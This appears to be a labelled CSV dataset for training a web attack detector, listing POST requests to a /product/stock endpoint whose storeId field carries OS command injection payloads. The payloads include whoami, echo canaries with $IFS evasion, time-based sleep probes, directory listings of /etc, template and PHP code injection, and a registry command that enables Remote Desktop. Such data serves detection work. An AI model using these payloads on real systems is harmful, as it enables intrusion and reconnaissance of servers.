method,path,body,dashes,andsign,dolar,orsign,lessthan,greaterthan,exclamation,badwords,class
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 ' echo UHJUHS$((68+93))$(echo UHJUHS)UHJUHS|,0,0,2,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 &&echo VNXUYU$((30+64))$(echo VNXUYU)VNXUYU&,0,1,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | echo HCOMBJ$((69+6))$(echo HCOMBJ)HCOMBJ,0,0,2,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1  echo SBCWOI$((11+5))$(echo SBCWOI)SBCWOI\,0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | [ 8 -ne $(echo ZDEVVW | tr -d '\n' | wc -c) ] || sleep 1 ',0,0,1,5,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 ;echo UWAPJX$((78+84))$(echo UWAPJX)UWAPJX&,0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 perl -e 'print ""X""x8192'",0,0,0,0,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 && reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f",0,1,0,0,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ""|echo FBMNPV$((56+92))$(echo FBMNPV)FBMNPV""",0,0,2,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 '| [ 9 -ne $(echo ZATMDT | tr -d '\n' | wc -c) ] || sleep 1 %22,0,0,1,5,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 &&echo$IFSAOUDEZ$((1+19))$(echo$IFSAOUDEZ)AOUDEZ|,0,1,4,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 ;echo UKKXOY$((15+70))$(echo UKKXOY)UKKXOY,0,0,2,0,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 ""; str=$(echo GJNRXW); str1=${#str}; if [ 7 -ne ${str1} ]; then sleep 0; else sleep 1; fi %22",0,0,3,0,0,0,0,3,bad
POST,/product/stock,"productId=2&storeId=1 ""|echo NGISBI$((50+27))$(echo NGISBI)NGISBI'",0,0,2,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 |echo$IFSEZAPVW$((95+18))$(echo$IFSEZAPVW)EZAPVW//,0,0,4,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 ||echo HXJEXE$((93+89))$(echo HXJEXE)HXJEXE\\,0,0,2,2,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 "".print(`echo ZLVKDU`.`echo $((0+22))`.`echo ZLVKDU`.`echo ZLVKDU`))}ZLVKDU",0,0,1,0,0,0,0,5,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 |echo$IFSQBNKUQ$((13+79))$(echo$IFSQBNKUQ)QBNKUQ&,0,0,4,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 '.print(`echo QLKXYP;echo $((79+46));echo QLKXYP;echo QLKXYP`);%5C%5CQLKXYP,0,0,1,0,0,0,0,5,bad
POST,/product/stock,productId=2&storeId=1  echo NYGDLL$((82+79))$(echo NYGDLL)NYGDLL|,0,0,2,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 &echo TITLCP$((35+27))$(echo TITLCP)TITLCP|,0,0,2,1,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 ""; str=$(echo UDCJAJ); str1=${#str}; if [ 1 -ne ${str1} ]; then sleep 0; else sleep 1; fi \\",0,0,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 &&echo RYKJGR$((75+28))$(echo RYKJGR)RYKJGR&,0,1,2,0,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 "");}print(`echo WCABAY
echo $((46+3))
echo WCABAY
echo WCABAY`);WCABAY",0,0,1,0,0,0,0,5,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 print(`echo BQVIXY\necho $((53+95))\necho BQVIXY\necho BQVIXY`);%252529%25257DBQVIXY,0,0,1,0,0,0,0,8,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 ;echo$IFSGIAMLN$((3+33))$(echo$IFSGIAMLN)GIAMLN//,0,0,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 ' echo MJNNEW$((18+53))$(echo MJNNEW)MJNNEW,0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 ;echo QPNMNQ$((33+62))$(echo QPNMNQ)QPNMNQ,0,0,2,0,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 ""&echo$IFSWZXINW$((50+11))$(echo$IFSWZXINW)WZXINW\",0,0,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 '; str=$(echo FBVDTE); str1=${#str}; if [ 4 -ne ${str1} ]; then sleep 0; else sleep 1; fi %22,0,0,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 &echo$IFSJHJDBQ$((59+7))$(echo$IFSJHJDBQ)JHJDBQ\,0,0,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 "");}print(`echo SFBDLE\necho $((73+49))\necho SFBDLE\necho SFBDLE`);%252529%25257DSFBDLE",0,0,1,0,0,0,0,8,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 "";echo$IFSFJALAO$((19+27))$(echo$IFSFJALAO)FJALAO\",0,0,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 '||echo QPBCIU$((74+42))$(echo QPBCIU)QPBCIU',0,0,2,2,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 ; dir,0,0,0,0,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ""
 str=$(echo LZSVGK)
 str1=${#str}
 if [ 2 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi",0,0,3,0,0,0,0,3,bad
POST,/product/stock,"productId=2&storeId=1 
echo MTJRGS$((58+47))$(echo MTJRGS)MTJRGS\",0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 
 str=$(echo DPBAVN)
 str1=${#str}
 if [ 8 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi '",0,0,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ||echo$IFSOQUJVO$((83+79))$(echo$IFSOQUJVO)OQUJVO""",0,0,4,2,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 ""& sleep 0 && str=$(echo FRMTBN) && str1=${#str} && [ 6 -eq ${str1} ] && sleep 1 %27",0,4,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 & ls -laR /etc,0,0,0,0,0,0,0,0,bad
POST,/product/stock,"productId=2&storeId=1 "");}print(`echo XILSBL\necho $((74+71))\necho XILSBL\necho XILSBL`);%25255C%25255CXILSBL",0,0,1,0,0,0,0,8,bad
POST,/product/stock,productId=2&storeId=1 exec('whoami'),0,0,0,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 ;echo SSPZUQ$((62+73))$(echo SSPZUQ)SSPZUQ,0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 |echo$IFSEDDVWA$((82+98))$(echo$IFSEDDVWA)EDDVWA&,0,0,4,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 '
 str=$(echo JTHMZI)
 str1=${#str}
 if [ 8 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi #",0,0,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ""||echo DKOIIU$((52+39))$(echo DKOIIU)DKOIIU|",0,0,2,3,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 
 str=$(echo DPBAVN)
 str1=${#str}
 if [ 5 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi '",0,0,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 echo$IFSNCOJPQ$((15+89))$(echo$IFSNCOJPQ)NCOJPQ""",0,0,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 {{4+4}},0,0,0,0,0,0,0,0,bad
POST,/product/stock,productId=2&storeId=1 system('pwd');,0,0,0,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ;echo$IFSUSDTON$((86+41))$(echo$IFSUSDTON)USDTON""",0,0,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 ||echo$IFSXRRNLV$((42+73))$(echo$IFSXRRNLV)XRRNLV\,0,0,4,2,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 '|echo$IFSMPTNCZ$((32+33))$(echo$IFSMPTNCZ)MPTNCZ""",0,0,4,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 '| [ 4 -ne $(echo RLZFDE | tr -d '\n' | wc -c) ] || sleep 1 #,0,0,1,5,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 '; str=$(echo ERVJHE); str1=${#str}; if [ 6 -ne ${str1} ]; then sleep 0; else sleep 1; fi \\,0,0,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 ||echo FEGCUU$((21+29))$(echo FEGCUU)FEGCUU,0,0,2,2,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 ; str=$(echo TNPFBA); str1=${#str}; if [ 1 -ne ${str1} ]; then sleep 0; else sleep 1; fi ',0,0,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 |echo UFFOUX$((59+47))$(echo UFFOUX)UFFOUX|,0,0,2,2,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 ||echo OYGMVZ$((16+56))$(echo OYGMVZ)OYGMVZ&,0,0,2,2,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | ls -l /var/www/*,0,0,0,1,0,0,0,0,bad
POST,/product/stock,"productId=2&storeId=1 
echo BJMVLS$((87+51))$(echo BJMVLS)BJMVLS&",0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 '; str=$(echo HLDNYH); str1=${#str}; if [ 7 -ne ${str1} ]; then sleep 0; else sleep 1; fi &,0,0,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 '| [ 6 -ne $(echo TYMEOG | tr -d '\n' | wc -c) ] || sleep 1 //,0,0,1,5,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 ""& sleep 0 && str=$(echo ENIIMV) && str1=${#str} && [ 6 -eq ${str1} ] && sleep 1 #",0,4,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 & sleep 0 && str=$(echo LVVACM) && str1=${#str} && [ 4 -eq ${str1} ] && sleep 1 //,0,4,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 &echo SGEJFS$((3+63))$(echo SGEJFS)SGEJFS',0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 echo$IFSBFVSUE$((14+45))$(echo$IFSBFVSUE)BFVSUE',0,0,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 '&&echo QINFDZ$((25+98))$(echo QINFDZ)QINFDZ\,0,1,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 &&echo$IFSZBRXDH$((79+80))$(echo$IFSZBRXDH)ZBRXDH&,0,1,4,0,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 
 str=$(echo YQABCF)
 str1=${#str}
 if [ 4 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi %7C",0,0,3,1,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 "";echo GSRLST$((57+23))$(echo GSRLST)GSRLST",0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ""|echo$IFSOQPWKQ$((62+90))$(echo$IFSOQPWKQ)OQPWKQ\\",0,0,4,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 ||echo FGCEYJ$((57+45))$(echo FGCEYJ)FGCEYJ|,0,0,2,3,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 ;echo$IFSMDODNG$((16+33))$(echo$IFSMDODNG)MDODNG""",0,0,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ""| [ 3 -ne $(echo TIQLNL | tr -d '\n' | wc -c) ] || sleep 1 %27",0,0,1,5,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 '
echo$IFSWTIGNL$((88+19))$(echo$IFSWTIGNL)WTIGNL&",0,0,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1  echo XHVOFZ$((83+80))$(echo XHVOFZ)XHVOFZ//,0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 '||echo$IFSWPLOYN$((11+61))$(echo$IFSWPLOYN)WPLOYN\\,0,0,4,2,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 {{4+8}},0,0,0,0,0,0,0,0,bad
POST,/product/stock,productId=2&storeId=1 & sleep 0 && str=$(echo JHKWGE) && str1=${#str} && [ 3 -eq ${str1} ] && sleep 1 %27,0,4,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 ${proc_open(print(`echo GSEIBK\necho $((71+35))\necho GSEIBK\necho GSEIBK`);%252529%25257DGSEIBK,0,0,2,0,0,0,0,8,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1  echo GQTWXI$((72+93))$(echo GQTWXI)GQTWXI\,0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 '
 str=$(echo TNNFNL)
 str1=${#str}
 if [ 7 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi |",0,0,3,1,0,0,0,3,bad
POST,/product/stock,"productId=2&storeId=1 "";echo$IFSLFGEOY$((22+44))$(echo$IFSLFGEOY)LFGEOY//",0,0,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 '; str=$(echo SVPWDE); str1=${#str}; if [ 9 -ne ${str1} ]; then sleep 0; else sleep 1; fi ',0,0,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 && perl -e 'print ""X""x4096'",0,1,0,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 '&echo FXSADU$((58+85))$(echo FXSADU)FXSADU//,0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 |echo DMMNWK$((14+86))$(echo DMMNWK)DMMNWK,0,0,2,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | [ 2 -ne $(echo DAJIYU | tr -d '\n' | wc -c) ] || sleep 1 |,0,0,1,6,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 ;/usr/bin/id\n,0,0,0,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ""&echo$IFSWFDEUL$((80+90))$(echo$IFSWFDEUL)WFDEUL""",0,0,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 ${popen(print(`echo UQCXVD\necho $((60+78))\necho UQCXVD\necho UQCXVD`);%25255C%25255CUQCXVD,0,0,2,0,0,0,0,8,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 '&echo OLOQKQ$((39+2))$(echo OLOQKQ)OLOQKQ""",0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 ;echo$IFSTLVRXR$((1+4))$(echo$IFSTLVRXR)TLVRXR,0,0,4,0,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 ""
 str=$(echo HFODHQ)
 str1=${#str}
 if [ 4 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi #",0,0,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 |echo YUWHXN$((65+16))$(echo YUWHXN)YUWHXN\\,0,0,2,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 '& sleep 0 && str=$(echo AGKSYR) && str1=${#str} && [ 4 -eq ${str1} ] && sleep 1 %5C%5C,0,4,3,0,0,0,0,3,bad
POST,/product/stock,"productId=2&storeId=1 ""& sleep 0 && str=$(echo ATDESO) && str1=${#str} && [ 4 -eq ${str1} ] && sleep 1",0,4,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 
 str=$(echo TYPSKV)
 str1=${#str}
 if [ 9 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi %27",0,0,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 |/bin/ls -al,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 'echo GZXGVN$((4+70))$(echo GZXGVN)GZXGVN\\,0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 
 str=$(echo ZSOAWG)
 str1=${#str}
 if [ 9 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi """,0,0,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 ||echo$IFSLYCEOO$((22+78))$(echo$IFSLYCEOO)LYCEOO|,0,0,4,3,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ||echo$IFSLSGJRQ$((28+34))$(echo$IFSLSGJRQ)LSGJRQ""",0,0,4,2,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1  echo WBCZIC$((68+36))$(echo WBCZIC)WBCZIC|,0,0,2,1,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 
echo$IFSOFYRTU$((52+75))$(echo$IFSOFYRTU)OFYRTU'",0,0,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ""|echo ZKFRXV$((90+79))$(echo ZKFRXV)ZKFRXV'",0,0,2,1,0,0,0,2,bad
